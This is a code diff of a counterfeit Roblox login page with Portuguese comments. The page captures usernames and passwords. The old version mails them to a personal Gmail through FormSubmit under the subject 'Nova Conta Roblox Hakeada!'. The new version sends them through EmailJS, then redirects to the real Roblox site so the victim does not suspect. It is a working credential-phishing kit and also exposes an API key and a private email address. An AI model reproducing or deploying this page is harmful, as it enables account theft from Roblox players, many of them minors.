@@ -3,122 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Login</title>
+    <title>Roblox</title>
+    <!-- Script do EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            // Inicializa com sua chave pública
+            emailjs.init("4nOCEE08jK86Ozlp3");
+        })();
+    </script>
     <style>
+        /* Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
         body {
-            font-family: 'Gotham', Arial, sans-serif;
-            background-color: #f2f4f5;
+            background-color: #232527; /* Fundo Escuro Roblox */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            color: white;
         }
-        .login-container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            width: 300px;
-            text-align: center;
-        }
-        h2 {
-            color: #393b3d;
-            margin-bottom: 20px;
-        }
-        input[type="text"], input[type="password"] {
+
+        .login-box {
+            background-color: #393b3d; /* Cor do Card */
+            padding: 40px;
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #e5e5e5;
-            border-radius: 4px;
-            box-sizing: border-box;
+            max-width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #e7e9ec;
+            border: 1px solid transparent;
+            border-radius: 5px;
+            font-size: 16px;
+            color: black;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #000;
+            background-color: #fff;
+        }
+
         button {
             width: 100%;
-            padding: 10px;
-            background-color: #00b06f;
+            padding: 14px;
+            background-color: #000; /* Botão Preto */
             color: white;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            border-radius: 5px;
+            font-size: 18px;
             font-weight: bold;
-            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
         }
+
         button:hover {
-            background-color: #009a5d;
+            background-color: #333;
         }
-        .footer-links {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #666;
+
+        button:disabled {
+            background-color: #555;
+            cursor: not-allowed;
         }
-        .footer-links a {
-            color: #007ff;
+
+        .links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #bdbec0;
+        }
+
+        .links a {
+            color: #bdbec0;
             text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        #status-msg {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            min-height: 20px;
         }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <h2>Entrar</h2>
-    
-    <!-- SEU FORMULÁRIO COM O FORMSUBMIT -->
-    <form action="https://formsubmit.co/joaomiguelalvesbarbosa91@gmail.com" method="POST" onsubmit="handleSubmit(event)">
-        
-        <!-- Campos de Input -->
-        <input type="text" name="username" placeholder="Usuário ou Email" required>
-        <input type="password" name="password" placeholder="Senha" required>
-        
-        <!-- Campo Oculto para Assunto do Email -->
-        <input type="hidden" name="_subject" value="Nova Conta Roblox Hakeada!">
-        
-        <!-- Redirecionamento após envio (Opcional: remove esta linha se quiser ficar na página) -->
-        <input type="hidden" name="_next" value="https://www.roblox.com">
-        
-        <!-- Botão -->
-        <button type="submit">Log In</button>
-    </form>
+    <div class="login-box">
+        <div class="logo">
+            <h1>ROBLOX</h1>
+        </div>
 
-    <div class="footer-links">
-        <a href="#">Esqueceu usuário ou senha?</a>
+        <form id="roblox-form">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Nome de usuário ou e-mail" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Senha" required>
+            </div>
+            
+            <button type="submit" id="btn-login">Entrar</button>
+            <p id="status-msg"></p>
+        </form>
+
+        <div class="links">
+            <a href="#">Esqueceu o nome de usuário ou a senha?</a><br><br>
+            <a href="#">Criar uma conta</a>
+        </div>
     </div>
-</div>
 
-<script>
-    async function handleSubmit(event) {
-        event.preventDefault(); // Impede o recarregamento padrão
+    <script type="text/javascript">
+        // CONFIGURAÇÕES
+        const SERVICE_ID = 'SEU_SERVICE_ID'; // ⚠️ SUBSTITUA AQUI PELO SEU SERVICE ID (ex: service_abc123)
+        const TEMPLATE_ID = 'template_ttaedjc';
         
-        const form = event.target;
-        const data = new FormData(form);
-        const ajax = fetch(form.action, {
-            method: form.method,
-            body: data,
-            headers: {
-                'Accept': 'application/json'
-            }
-        });
+        const form = document.getElementById('roblox-form');
+        const btn = document.getElementById('btn-login');
+        const statusMsg = document.getElementById('status-msg');
 
-        ajax.then((response) => {
-            if (response.ok) {
-                // Sucesso: Mostra alerta e redireciona
-                alert("Login realizado com sucesso!");
-                window.location.href = "https://www.roblox.com";
-            } else {
-                response.json().then(data => {
-                    if (Object.hasOwn(data, 'errors')) {
-                        alert(data["errors"].map(error => error["message"]).join(", "));
-                    } else {
-                        alert("Houve um problema. Tente novamente.");
-                    }
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Muda estado do botão
+            btn.disabled = true;
+            btn.innerText = "Entrando...";
+            statusMsg.innerText = "";
+
+            // Envia para o EmailJS
+            emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
+                .then(() => {
+                    // Sucesso: Redireciona para o site real do Roblox para não desconfiar
+                    window.location.href = "https://www.roblox.com/home";
                 })
-            }
-        }).catch((error) => {
-            alert("Houve um problema. Tente novamente.");
+                .catch((error) => {
+                    // Erro: Mostra mensagem na tela
+                    btn.disabled = false;
+                    btn.innerText = "Entrar";
+                    statusMsg.style.color = "#ff4d4d";
+                    statusMsg.innerText = "Erro de conexão. Tente novamente.";
+                });
         });
-    }
-</script>
+    </script>
+
+</body>
+</html>
 
 </body>
 </html>
